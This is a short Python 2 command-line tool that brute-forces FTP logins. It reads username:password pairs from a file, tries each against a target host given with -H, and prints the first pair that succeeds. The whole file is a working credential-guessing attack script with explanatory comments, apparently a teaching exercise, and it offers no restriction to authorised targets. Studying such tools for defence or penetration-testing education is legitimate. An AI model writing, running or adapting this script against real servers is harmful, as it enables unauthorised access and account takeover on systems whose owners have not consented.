import ftplib
import optparse
def bruteForceLogin(hostname, passwordFile):
	# Try to open the specified password file, if not print the error to the screen and exit
	try:
		passFile = open(passwordFile, "r")
	except Exception, e:
		print "\n[-] Could not open password file" 
		print "[-] " + str(e) 
		exit(-1)
	# For each line in the password file strip away the special characters
	for line in passFile.readlines():
		userName = line.split(":")[0]
		passWord = line.split(":")[1].strip("\r").strip("\n")
		print "[+] Trying: " + userName + "/" + passWord
		try:
			# Start an FTP connection and try to connect
			ftp = ftplib.FTP(hostname)
			ftp.login(userName, passWord)
			# If the login succeeds then we've found the right username/password. Print these to the screen
			print "\n[*] " + hostname + " FTP Logon Succeeded: " + userName + "/" + passWord
			ftp.quit()
			return (userName, passWord)
		except Exception, e:
			# If something goes wrong, such as using the wrong username/password, don't do anything and carry on
			pass
	print "\n[-] Could Not Brute Force FTP Credentials"
	return (None, None)
def main():
	# Create an option parser and give it a usage statement and options
	parser = optparse.OptionParser("Usage: " + "-h <Target Host> -p <Specify a Username/Password File>")
	parser.add_option("-H", dest = "host", type = "string", help = "Specify a Target Host")
	parser.add_option("-P", dest = "passwordFile", type = "string", help = "Specify a Password File")
	(options, args) = parser.parse_args()
	# If there aren't any options then print the usage statement and exit
	if (options.host == None or options.passwordFile == None):
		print parser.usage
		exit(0)
	else:
		# Set the options to local variables
		host = options.host
		passwordFile = options.passwordFile
	# Call the above function and pass it some arguments
	bruteForceLogin(host, passwordFile)
if __name__ == "__main__":
	main()
